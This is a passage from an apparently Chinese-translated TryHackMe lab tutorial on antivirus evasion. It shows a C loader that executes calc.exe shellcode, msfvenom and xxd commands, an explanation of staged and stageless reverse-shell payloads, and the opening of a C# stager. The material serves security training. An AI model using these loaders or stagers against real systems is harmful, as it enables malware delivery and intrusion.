style="color:#e3116c">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        DWORD oldProtect</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">VirtualProtect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">stager</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">stager</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PAGE_EXECUTE_READ</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">oldProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">stager</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">shellcode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>现在让我们将其编译为exe文件：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Compile our C program for Windows</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ i686-w64-mingw32-gcc calc.c </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> calc-MSF.exe</span><br></span></code></pre></div></div>
<p>一旦我们有了exe文件，让我们将其传输到Windows机器并执行它。 要传输文件，您可以使用AttackBox上的smbclient访问<code>\\MACHINE_IP\Tools</code>处的SMB共享，使用以下命令（记住<code>thm</code>用户的密码是<code>Password321</code>）：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Copy calc-MSC.exe to Windows Machine</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ smbclient </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> thm </span><span class="token string" style="color:#e3116c">&#x27;//10.82.134.191/Tools&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">smb: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> put calc-MSF.exe</span><br></span></code></pre></div></div>
<p>这应该会在Windows机器的<code>C:\Tools\</code>中复制您的文件。</p>
<p>虽然您的机器的AV应该被禁用，但请随意尝试将您的有效负载上传到THM Antivirus Check，地址为<code>http://MACHINE_IP/</code>。</p>
<p><img decoding="async" loading="lazy" alt="执行MSF有效负载以运行calc.exe" src="/TryHackMe-CN/assets/images/image_20251136-223631-e57b4eebf3b2c656c949107a086f6c98.png" width="1240" height="599" class="img_ev3q"></p>
<p>Metasploit框架有许多其他shellcode格式和类型，可满足您的所有需求。 我们强烈建议您更多地试验它，并通过生成不同的shellcode来扩展您的知识。</p>
<p>前面的示例展示了如何生成shellcode并在目标机器中执行它。 当然，您可以复制相同的步骤来创建不同类型的shellcode，例如Meterpreter shellcode。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="从exe文件生成shellcode">从EXE文件生成Shellcode<a href="#从exe文件生成shellcode" class="hash-link" aria-label="从EXE文件生成Shellcode的直接链接" title="从EXE文件生成Shellcode的直接链接" translate="no">​</a></h3>
<p>Shellcode也可以存储在<code>.bin</code>文件中，这是一种原始数据格式。 在这种情况下，我们可以使用<code>xxd -i</code>命令获取其shellcode。</p>
<p>C2框架将shellcode作为原始二进制文件<code>.bin</code>提供。 如果是这种情况，我们可以使用Linux系统命令<code>xxd</code>来获取二进制文件的十六进制表示。 为此，我们执行以下命令：<code>xxd -i</code>。</p>
<p>让我们使用msfvenom创建一个原始二进制文件来获取shellcode：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Generate a Raw shellcode to Execute calc.exe</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> x86 </span><span class="token parameter variable" style="color:#36acaa">--platform</span><span class="token plain"> windows </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/exec </span><span class="token assign-left variable" style="color:#36acaa">cmd</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">calc.exe </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> raw </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /tmp/example.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: </span><span class="token number" style="color:#36acaa">193</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> /tmp/example.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/example.bin: data</span><br></span></code></pre></div></div>
<p>并在创建的文件上运行<code>xxd</code>命令：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Get the shellcode using the xxd command</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ xxd </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> /tmp/example.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char _tmp_example_bin</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned int _tmp_example_bin_len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">193</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>如果我们将输出与之前使用Metasploit创建的shellcode进行比较，它们是匹配的。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 应用我们在本任务中讨论的内容，为下一个主题做好准备！ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-6-分阶段载荷">任务 6 分阶段载荷<a href="#任务-6-分阶段载荷" class="hash-link" aria-label="任务 6 分阶段载荷的直接链接" title="任务 6 分阶段载荷的直接链接" translate="no">​</a></h2>
<p>在我们的目标中绕过 AV，我们将找到两种主要方法来向受害者交付最终的 shellcode。 根据方法的不同，您会发现载荷通常被分类为<strong>分阶段</strong>或<strong>无阶段</strong>载荷。 在本任务中，我们将探讨两种方法的差异以及每种方法的优势。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="无阶段载荷">无阶段载荷<a href="#无阶段载荷" class="hash-link" aria-label="无阶段载荷的直接链接" title="无阶段载荷的直接链接" translate="no">​</a></h3>
<p>无阶段载荷将最终的 shellcode 直接嵌入到自身中。 将其视为一个打包的应用程序，以单步过程执行 shellcode。 在之前的任务中，我们嵌入了一个可执行文件，该文件嵌入了一个简单的 <code>calc</code> shellcode，从而创建了一个无阶段载荷。</p>
<p><img decoding="async" loading="lazy" alt="无阶段载荷" src="/TryHackMe-CN/assets/images/image_20251149-204902-6d6c86a41fb1286540508ee0dd221a4f.png" width="1386" height="364" class="img_ev3q"></p>
<p>在上面的示例中，当用户执行恶意载荷时，嵌入的 shellcode 将运行，为攻击者提供反向 shell。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="分阶段载荷">分阶段载荷<a href="#分阶段载荷" class="hash-link" aria-label="分阶段载荷的直接链接" title="分阶段载荷的直接链接" translate="no">​</a></h3>
<p>分阶段载荷通过使用中间 shellcode 来工作，这些中间 shellcode 作为执行最终 shellcode 的步骤。 这些中间 shellcode 中的每一个被称为<strong>阶段器</strong>，其主要目标是提供一种方法来检索最终的 shellcode 并最终执行它。</p>
<p>虽然可能存在具有多个阶段的载荷，但通常情况涉及一个两阶段载荷，其中第一阶段，我们称之为<strong>阶段0</strong>，是一个存根 shellcode，它将连接回攻击者的机器以下载要执行的最终 shellcode。</p>
<p><img decoding="async" loading="lazy" alt="分阶段载荷 - 阶段0" src="/TryHackMe-CN/assets/images/image_20251149-204920-5962a6b7f0ae8c5bc07dd0b0cd13f150.png" width="1386" height="364" class="img_ev3q"></p>
<p>一旦检索到，阶段0存根将在载荷进程的内存中的某个位置注入最终的 shellcode 并执行它（如下所示）。</p>
<p><img decoding="async" loading="lazy" alt="分阶段载荷 - 发送反向 Shell" src="/TryHackMe-CN/assets/images/image_20251149-204935-1395e4ae7dc4891e997fd97ed8d1f65f.png" width="1386" height="370" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="分阶段-vs-无阶段">分阶段 vs. 无阶段<a href="#分阶段-vs-无阶段" class="hash-link" aria-label="分阶段 vs. 无阶段的直接链接" title="分阶段 vs. 无阶段的直接链接" translate="no">​</a></h3>
<p>在决定使用哪种类型的载荷时，我们必须了解我们将攻击的环境。 每种载荷类型根据具体的攻击场景都有其优势和劣势。</p>
<p>对于无阶段载荷，您将发现以下优势：</p>
<ul>
<li class="">生成的可执行文件打包了使我们的 shellcode 工作所需的所有内容。</li>
<li class="">载荷将在不需要额外网络连接的情况下执行。 网络交互越少，被 IPS 检测到的机会就越小。</li>
<li class="">如果您正在攻击一个网络连接非常受限的主机，您可能希望整个载荷都在一个包中。</li>
</ul>
<p>对于分阶段载荷，您将拥有：</p>
<ul>
<li class="">磁盘上的占用空间小。 由于阶段0仅负责下载最终的 shellcode，它很可能体积较小。</li>
<li class="">最终的 shellcode 没有嵌入到可执行文件中。 如果您的载荷被捕获，蓝队将只能访问阶段0存根，而无法获得更多信息。</li>
<li class="">最终的 shellcode 被加载到内存中，从不接触磁盘。 这使得它不太容易被 AV 解决方案检测到。</li>
<li class="">您可以对许多 shellcode 重复使用相同的阶段0投放器，因为您可以简单地替换提供给受害者机器的最终 shellcode。</li>
</ul>
<p>总之，除非我们为其添加一些上下文，否则我们不能说哪种类型比另一种更好。 一般来说，无阶段载荷更适合具有大量边界安全的网络，因为它不依赖于必须从互联网下载最终的 shellcode。 例如，如果您正在执行 USB 投放攻击以针对封闭网络环境中的计算机，并且您知道无法与您的机器建立连接，那么无阶段是首选。</p>
<p>另一方面，当您希望本地机器上的占用空间减少到最小时，分阶段载荷非常有用。 由于它们在内存中执行最终载荷，一些 AV 解决方案可能更难检测到它们。 它们也非常适合避免暴露您的 shellcode（这些 shellcode 通常需要相当长的时间来准备），因为 shellcode 在任何时候都不会被投放到受害者的磁盘上（作为工件）。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="metasploit-中的阶段器">Metasploit 中的阶段器<a href="#metasploit-中的阶段器" class="hash-link" aria-label="Metasploit 中的阶段器的直接链接" title="Metasploit 中的阶段器的直接链接" translate="no">​</a></h3>
<p>在使用 msfvenom 创建载荷或在 Metasploit 中直接使用它们时，您可以选择使用分阶段或无阶段载荷。 例如，如果您想生成一个反向 TCP shell，您会发现有两个载荷用于此目的，名称略有不同（注意 <code>shell</code> 后的 <code>_</code> 与 <code>/</code>）：</p>
<table><thead><tr><th style="text-align:left">载荷</th><th style="text-align:left">类型</th></tr></thead><tbody><tr><td style="text-align:left">windows/x64/shell_reverse_tcp</td><td style="text-align:left">无阶段载荷</td></tr><tr><td style="text-align:left">windows/x64/shell/reverse_tcp</td><td style="text-align:left">分阶段载荷</td></tr></tbody></table>
<p>您通常会发现相同的命名模式应用于其他类型的 shell。 例如，要使用无阶段 Meterpreter，我们会使用 <code>windows/x64/meterpreter_reverse_tcp</code>，而不是 <code>windows/x64/meterpreter/reverse_tcp</code>，后者是其分阶段对应物。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="创建您自己的阶段器">创建您自己的阶段器<a href="#创建您自己的阶段器" class="hash-link" aria-label="创建您自己的阶段器的直接链接" title="创建您自己的阶段器的直接链接" translate="no">​</a></h3>
<p>要创建分阶段载荷，我们将使用由 <a href="https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs" target="_blank" rel="noopener noreferrer" class="">@mvelazc0</a> 提供的阶段器代码的略微修改版本。 我们阶段器的完整代码可以在此处获取，但也可以在您的 Windows 机器上的 <code>C:\Tools\CS Files\StagedPayload.cs</code> 中找到：</p>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 完整载荷代码（点击阅读） </summary><div><div class="collapsibleContent_i85q"><div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Net</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Text</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Configuration</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Install</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Runtime</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">InteropServices</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Security</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Cryptography</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">X509Certificates</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">Program</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">DllImport</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flAllocationType</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">DllImport</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">IntPtr</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadAttributes</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwStackSize</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddress</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">IntPtr</span><span class="token plain"> param</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwCreationFlags</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">DllImport</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token punctuation" 